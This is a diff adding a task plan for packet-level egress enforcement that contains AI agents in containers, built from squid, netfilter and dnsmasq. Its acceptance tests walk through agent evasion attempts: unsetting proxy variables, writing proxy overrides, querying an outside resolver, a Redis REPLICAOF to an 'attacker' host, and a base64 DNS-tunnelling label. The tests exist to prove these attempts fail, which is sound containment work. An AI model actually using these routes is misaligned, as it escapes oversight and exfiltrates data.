@@ -243,3 +243,163 @@ cost is an identity migration plus an ingestion path that gets thrown away.
 | 5 — US3 (deferred) | 3 |
 | 6 — Polish | 8 |
 | **Total** | **64** (61 in scope, 3 deferred) |
+
+---
+
+# Phase B — transparent enforcement (US4/US5)
+
+**IDs run from T100** so the phase boundary is unmistakable and cannot collide with a lettered
+insertion above. Phase A's tasks are the delivered record and are not revisited.
+
+**Read the plan's opening decision first**: FR-018b takes effect **with this phase**. Phase A's
+two-key syntax stays correct until T112 migrates it — the delivered code is not broken in the
+interim.
+
+**Tests**: acceptance-heavy by necessity. US4's claim is about what a **hostile process cannot
+do**, which no unit test can establish. Every evasion scenario drives the container adversarially.
+
+---
+
+## Phase 7 (B1): The image — prove the mechanism before building on it
+
+**Purpose**: If SNI filtering without decryption does not work, this phase has no mechanism and
+everything after it is wasted. Prove it first, as Phase A proved the proxy by running four of them.
+
+- [ ] T100 Create `image/egress/Dockerfile` for Phase B — Alpine + **squid 6.12** (`--with-openssl`, verified in research R12) + `dnsmasq` + `iptables`, replacing tinyproxy. Keep the rootless posture for squid itself; only the entrypoint needs `NET_ADMIN`
+- [ ] T101 Write `image/egress/entrypoint.sh`: install the netfilter rules, start dnsmasq, then **exec** squid so compose owns PID 1 and the container dies with the proxy
+- [ ] T102 **Prove peek-and-splice end to end by running it**: an allowed SNI splices through and the client sees the **real server certificate**; a disallowed SNI is terminated. Record in research R12b. **If the client sees a proxy-generated certificate, stop** — that is `bump`, not `splice`, and it breaks R2/Constitution III
+- [ ] T103 Settle FR-020e by running dnsmasq: does `local=/#/` return **NXDOMAIN** or can it return **REFUSED**? NXDOMAIN says "no such host" where the truth is "policy", and the error path must not be designed around the wrong signal. Record in research R13a
+- [ ] T104 Verify the agent container's capability set is **unchanged** with `network_mode: service:egress` — `CapAdd: []` on the agent, `[NET_ADMIN]` on the proxy (SC-011, quickstart S16). **This is the blocking check for the whole phase**
+
+**Checkpoint**: the mechanism exists and does not decrypt. Do not proceed without T102 and T104.
+
+---
+
+## Phase 8 (B2): Generation — one declaration, three surfaces
+
+- [ ] T105 Implement the unified `egress.allow` schema in `bin/agent-container` — entries `{provider}`, `{provider, hosts}`, `{host}`, `{host, port}` (FR-018a); **the port selects the enforcement surface**
+- [ ] T106 [P] Add schema tests in `bin/tests/test_agent_as_code.py` for all four entry shapes, plus a `{host, port}` with a non-integer port and a port outside 1–65535
+- [ ] T107 Render the **squid** allowlist from the declaration in `bin/agent-container`: bare host for exact, **leading dot** for subdomains, and **never quoted** — research R12a measured that a quoted entry is read as a FILE PATH and yields an acl with no entries
+- [ ] T108 [P] Add a test asserting the squid rendering is unquoted and uses the leading-dot form, and that `*.example.com` from Phase A's syntax is **translated, not passed through** (FR-018a)
+- [ ] T109 Render the **netfilter** rules from `{host, port}` entries in `bin/agent-container` — default-deny OUTPUT, REDIRECT 80/443 to squid, REDIRECT 53 to dnsmasq, explicit ACCEPT per declared host+port (FR-017/FR-018)
+- [ ] T110 [P] Add a test proving the generated ruleset **denies by default** — an undeclared port produces no ACCEPT rule, and the policy is DROP rather than ACCEPT. The first design sketch got this wrong, and default-accept is worse than no control
+- [ ] T111 Render the **dnsmasq** config from the same list in `bin/agent-container` — allowlist-only resolution, upstream from FR-020c's enumerated set (FR-020/FR-020b/FR-020c)
+- [ ] T112 Migrate Phase A's two-key syntax to the unified list (FR-018b) — **removed, not deprecated**. Update `validate_egress`, `validate_provider_entry`, `resolve_provider_hosts` and the ~15 tests that pin the old shape
+- [ ] T113 [P] Add a test proving a Phase A two-key declaration is **refused with a migration message naming the replacement**, not silently ignored — the FR-005 refuse-don't-ignore precedent
+- [ ] T114 Prove the three renderings agree: one declaration, three surfaces, and a test that a host declared once appears in **all three** (or, for a ported entry, in netfilter only). Drift between surfaces is the failure this unified schema exists to prevent
+
+**Checkpoint**: one list generates three consistent surfaces; the old syntax migrates loudly.
+
+---
+
+## Phase 9: User Story 4 — enforcement the agent cannot switch off (P1)
+
+**Goal**: the declaration holds even when the agent actively evades it.
+
+**Independent test**: unset every proxy variable inside the container and reach an undeclared host —
+it must fail (quickstart S12).
+
+- [ ] T115 [US4] Emit `network_mode: service:egress` on the agent service and `cap_add: [NET_ADMIN]` on the egress service in `build_compose_model` (FR-016/FR-019)
+- [ ] T116 [US4] **Move the published port binding to the egress service** — a shared namespace has one port owner. The port *number* is unchanged, so the identity lock still passes; this is an announced **migration**, not an edit (Constitution IV, plan)
+- [ ] T117 [US4] Add a test in `bin/tests/test_compose.py` pinning the new port ownership **and** asserting `port_for_name` is unchanged, so the migration is visible in exactly one place
+- [ ] T118 [US4] Handle the migration for **already-running Phase A environments** in `bin/agent-container`: detect the old shape and recreate rather than leave a container whose port the tool no longer owns
+- [ ] T119 [US4] Implement FR-021 — when transparent enforcement cannot be delivered on a host, fall back to Phase A's mechanism under `advisory` and refuse under `strict`, **naming which mode was obtained**. Without this, `strict` cannot be honest about what it got
+- [ ] T120 [US4] Place operator sidecars **inside** the boundary by default (FR-023), with an explicit opt-out (FR-023a)
+- [ ] T121 [US4] Name every out-of-boundary sidecar in the enforcement statement (FR-023b, **SC-015**) — otherwise `enforced: true` quietly means "except for these three containers", which is the overclaim SC-004 forbids wearing a different hat
+- [ ] T122 [US4] Extend `validate_sidecar_override` to check **egress posture**, not only shape (FR-023d) — it was cosmetic before this feature and is security-relevant after
+- [ ] T123 [US4] Ensure no automatic project-network allowance is granted (FR-023c) — that would be the hidden baseline FR-001e forbids, reintroduced by the back door
+
+### Evasion acceptance (US4) — the only tests that can establish the claim
+
+- [ ] T124 [US4] Acceptance: unset **every** proxy variable and reach an undeclared host — must fail (SC-008, quickstart S12). Under Phase A this **succeeds**; that difference is the feature
+- [ ] T125 [US4] Acceptance: write proxy overrides into `~/.agent-env/env`, open a new shell, retry — must still fail. This is the hole Phase A had to *disclose* under FR-008a
+- [ ] T126 [US4] Acceptance: assert the agent container's capability set is **identical** to an undeclared environment's (SC-011, quickstart S16)
+- [ ] T127a [US4] Acceptance: place a sidecar **outside** the boundary and assert it is **named** in the enforcement statement and in `--json` (SC-015). An unnamed exception is indistinguishable from a bug
+- [ ] T127 [US4] Acceptance: drive a real `redis REPLICAOF attacker:6379` through an operator sidecar — must be refused (SC-014, quickstart S17). The agent needn't escape the namespace; it need only ask something that already has the access
+
+**Checkpoint**: US4 is independently testable. Run quickstart S12, S16, S17.
+
+---
+
+## Phase 10: User Story 5 — every protocol and port declared, or it fails (P1)
+
+**Goal**: default-deny across every port and protocol, with DNS closed as an exfiltration channel.
+
+**Independent test**: declare one HTTPS provider; confirm SSH, FTP and an arbitrary high port all
+fail, then declare SSH to one host and confirm only that host on that port opens (quickstart S13/S14).
+
+- [ ] T128 [US5] Force **all** port-53 traffic to the sidecar resolver via netfilter (FR-020a) so an agent cannot select its own resolver
+- [ ] T129 [US5] Implement allowlist-only resolution (FR-020b) — declared names resolve, everything else does not
+- [ ] T130 [P] [US5] Record refused resolutions (FR-020d), for the same reason a refused connection is recorded
+- [ ] T131 [US5] Make a refusal distinguishable from a genuine "no such host" (FR-020e), per T103's finding
+- [ ] T132 [US5] Add the **SSH arm to FR-003c's deploy-time check** — default-deny kills `git push` over SSH unless port 22 is declared. Hard Constraint #1 breaking from the opposite direction to Phase A's HTTPS case
+- [ ] T133 [P] [US5] Add a test for T132: fires for an SSH remote with no `{host, port: 22}` entry, silent when declared
+
+### Default-deny acceptance (US5)
+
+- [ ] T134 [US5] Acceptance: an undeclared **non-standard HTTP port** (8080) and an arbitrary port (1337) both fail (SC-009, quickstart S13). **The first design sketch got this wrong** — redirecting only 80/443 under default-accept lets 8080 through, which is worse than no control
+- [ ] T135 [US5] Acceptance: a declared `{host, port: 22}` is reachable at **that host and that port only** — not the protocol generally, not another host (SC-010, quickstart S14)
+- [ ] T136 [US5] Acceptance: an undeclared name does not resolve, **including a tunnelling-shaped label** like `ZXhmaWx0cmF0ZWQ.attacker.example.com` (SC-012, quickstart S15)
+- [ ] T137 [US5] Acceptance: `dig @8.8.8.8` is forced to the sidecar resolver (SC-013, quickstart S15)
+- [ ] T138 [US5] Acceptance: `git push` over declared SSH **succeeds** (quickstart S18). If this fails the feature is unshippable, whatever else passes
+- [ ] T139 [US5] Acceptance: an environment with **no** declaration is untouched — no rules, no forced DNS, unrestricted (FR-004, quickstart S19). Default-deny applies to opt-in environments, **never retroactively**
+
+**Checkpoint**: US5 independently testable. Run quickstart S13, S14, S15, S18, S19.
+
+---
+
+## Phase 11: Honesty and polish
+
+- [ ] T140 Rewrite the enforcement-strength statement (FR-022) in `bin/agent-container` — enforcement is now **packet-level and does not depend on the agent's cooperation**; what remains outside are deliberately-placed sidecars, each named
+- [ ] T141 **Rewrite, do not delete, the overclaim test** in `bin/tests/test_cli.py`. Some of "guarantee"/"blocks all"/"prevents all" becomes defensible under packet-level enforcement — decide which, and keep a guard. Deleting it at the moment the claims get stronger is exactly the wrong instinct
+- [ ] T142 [P] Rewrite `docs/egress.md` — enforcement is a boundary now, not a convention. Correct the "proxy-level, not packet-level" framing throughout
+- [ ] T143 [P] Update `docs/execution.md` and `docs/orchestration.md` for the shared namespace and the port-owner move
+- [ ] T144 Re-measure `CLAUDE.md` against its 2000-token budget with a real tokenizer, and update the egress invariant — it currently says "proxy-level", which Phase B falsifies
+- [ ] T145 Re-run the identity check against the T001 baseline. **It will pass** — the port number is unchanged — so verify the *port owner* separately; the lock cannot see that, which is why T116/T117 exist
+- [ ] T146 Run `scripts/quality-gate.sh` **unpiped** plus the full acceptance tier, and verify quickstart S12–S19 by hand
+
+---
+
+## Phase B dependencies
+
+```text
+Phase 7 (T100-T104)   mechanism proven — T102 and T104 BLOCK everything
+        ↓
+Phase 8 (T105-T114)   generation; T112 migrates Phase A's schema
+        ↓
+   ┌────┴────┐
+   ↓         ↓
+Phase 9    Phase 10   US4 and US5 share the netfilter surface but test independently
+(US4)      (US5)
+   └────┬────┘
+        ↓
+Phase 11 (T140-T146)  T145 blocking
+```
+
+- **T102 blocks everything** — no splice, no phase.
+- **T104 blocks T115** — if the agent gains a capability, the design has inverted its own principle.
+- **T105 blocks T107/T109/T111** — all three renderings read the same parsed list.
+- **T116 blocks T118** — the migration must exist before it can be applied to running environments.
+
+## Phase B parallel opportunities
+
+| Batch | Tasks | Why safe |
+|---|---|---|
+| Rendering tests | T106, T108, T110, T113 | independent assertions over separate generators |
+| Docs | T142, T143 | separate files |
+| DNS detail | T130, T133 | different modules from the netfilter work |
+
+US4 and US5 can proceed in parallel after Phase 8 — they share the mechanism but their tests and
+failure modes are disjoint.
+
+## Phase B task count
+
+| Phase | Tasks |
+|---|---|
+| 7 — B1 image | 5 |
+| 8 — B2 generation | 10 |
+| 9 — US4 | 14 |
+| 10 — US5 | 12 |
+| 11 — polish | 7 |
+| **Phase B total** | **48** |
+| **Feature total** | **112** (64 Phase A + 48 Phase B) |
